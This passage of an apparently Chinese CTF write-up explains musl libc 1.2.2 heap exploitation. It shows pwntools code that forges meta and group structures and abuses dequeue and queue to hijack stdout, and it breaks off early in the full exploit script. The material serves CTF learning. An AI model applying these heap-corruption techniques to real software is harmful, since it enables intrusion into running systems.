+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;5&#34;</span><span class="o">*</span><span class="mh">0x28</span><span class="p">,</span><span class="mh">0x1200</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#0x1200:防止将mmap出来的group归还给堆管理器</span>
+</span></span><span class="line"><span class="cl"><span class="n">last_idx</span><span class="p">,</span> <span class="n">freeable</span><span class="p">,</span> <span class="n">sc</span><span class="p">,</span> <span class="n">maplen</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#fake meta</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stdout</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">)</span>                  <span class="c1"># prev</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_meta_addr</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">)</span>         <span class="c1"># next</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_mem_addr</span><span class="p">)</span>                 <span class="c1"># mem</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                    <span class="c1"># avail_mask, freed_mask</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">((</span><span class="n">maplen</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">sc</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">freeable</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">|</span> <span class="n">last_idx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#对齐</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#fake group</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_mem</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_meta_addr</span><span class="p">)</span>                  <span class="c1"># meta</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_mem</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                    
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0xaa0</span> <span class="c1">#pad,为了页对齐，让secret在页起始位置</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#fake meta area</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">fake_meta</span> <span class="o">+</span> <span class="n">fake_mem</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">find</span><span class="p">(</span><span class="mh">0x1200</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#设置stdout-0x10为fake_group_addr</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># dequeue 2 set stdout_file - 0x10 (where the final fake group)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">   <span class="n">find</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pd</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">elfbase</span><span class="o">+</span><span class="mh">0x4fc0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">fake_mem_addr</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x38</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x28</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;6&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="n">pd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delet</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span> <span class="c1">#dequeue</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p><strong>queue</strong></p>
+<p>触发<code>queue</code>还是需要通过<code>get_meta</code>的检查，然后就是走<code>nontrivial_free</code>的<code>else_if</code>分支：</p>
+<ul>
+<li><code>freeable == 0</code></li>
+<li>这里<code>sc</code>等于几就是进第几个<code>active</code>链表，但是需要<code>sc&lt;48</code></li>
+</ul>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-py"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># queue 把fake_meta链入active[8]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># reset fake meta , free fake chunk 2 queue it(queue the fake meta)</span>
+</span></span><span class="line"><span class="cl"><span class="n">last_idx</span><span class="p">,</span> <span class="n">freeable</span><span class="p">,</span> <span class="n">sc</span><span class="p">,</span> <span class="n">maplen</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">0</span> <span class="c1">#freeable置0是为了拒绝ok to free校验，防止释放meta</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                              <span class="c1"># prev</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                             <span class="c1"># next</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_mem_addr</span><span class="p">)</span>                 <span class="c1"># mem</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                    <span class="c1"># avail_mask, freed_mask</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">((</span><span class="n">maplen</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">sc</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">freeable</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">|</span> <span class="n">last_idx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_mem</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_meta_addr</span><span class="p">)</span>                  <span class="c1"># meta</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_mem</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;z&#39;</span> <span class="o">*</span> <span class="mh">0xa90</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">fake_meta</span> <span class="o">+</span> <span class="n">fake_mem</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#z()</span>
+</span></span><span class="line"><span class="cl"><span class="n">find</span><span class="p">(</span><span class="mh">0x1200</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">find</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x28</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pd</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">elfbase</span><span class="o">+</span><span class="mh">0x5fc0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">fake_mem_addr</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x38</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x28</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;7&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="n">pd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delet</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;fake_meta_addr&#34;</span><span class="p">)</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p>接着把<code>fake_meta-&gt;mem</code>改为<code>stdout-0x10</code>即可把堆块申请到<code>stdout</code>上了</p>
+<h3 class="heading-element" id="exp"><span>exp</span>
+  <a href="#exp" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-py"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="3" style="--fi-max-shown-lines:10;--fi-line-digit:3;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">address</span> <span class="o">=</span> <span class="s1">&#39;./pwn&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># address = &#39;./pwn_patched&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">address</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;../musl-libc/v1.2.2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#-----------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ss</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">lgaddr</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">,</span><span class="n">addr</span>		        <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">lg</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>			        <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="n">l64</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">l32</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\xf7</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">r64</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
